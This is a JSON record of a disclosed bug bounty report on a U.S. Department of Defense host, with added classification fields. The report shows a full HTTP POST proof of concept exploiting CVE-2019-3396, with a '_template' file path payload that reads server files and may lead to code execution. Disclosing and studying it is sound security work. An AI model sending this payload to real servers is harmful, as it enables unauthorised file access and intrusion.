{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "nahamsec ",
  "title": "LFI with potential to RCE on ██████ using CVE-2019-3396",
  "content": "\nPOC\nCode 283 Bytes\n1POST /rest/tinymce/1/macro/preview HTTP/1.1\n2Host: ██████\n3Content-Type: application/json\n4Content-Length: 174\n5\n6{\"contentId\":\"12345\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.youtube.com/watch?v=wHEHYJpCkpg\",\"width\":\"300\",\"height\":\"200\",\"_template\":\"file://../\"}}}\nThanks,\nBen\nImpact\n\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Remote File Inclusion"
  ],
  "screenshots": {},
  "disclosed_date": 1570216620,
  "report_url": "https://hackerone.com/reports/538771",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to the vulnerable endpoint with a malicious JSON payload that includes a file path in the '_template' parameter."
    ],
    [
      2,
      "Observe the server's response, which may include the contents of the specified file, indicating successful Local File Inclusion (LFI)."
    ]
  ],
  "vuln_description": "This vulnerability is a Local File Inclusion (LFI) in a web application that uses a specific macro preview feature. By manipulating the '_template' parameter in the JSON payload, an attacker can read arbitrary files from the server's filesystem. This could potentially lead to Remote Code Execution (RCE) if the attacker can access and manipulate critical files.",
  "reason": "The attack involves a single straightforward step of crafting a malicious JSON payload and sending it to a known vulnerable endpoint. The interaction is direct and does not require understanding complex application states or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability report involves an LFI with potential RCE using CVE-2019-3396, which is a specific exploit targeting a Confluence Server vulnerability. The proposed methodologies focus on AuthN/AuthZ bugs like IDOR and AuthZ bypasses by swapping user sessions and resource IDs within the same application. The LFI/RCE exploit does not fit into these categories as it does not involve session or resource ID manipulation but rather exploits a file inclusion vulnerability in a specific endpoint.",
    "is_detectable": false
  }
}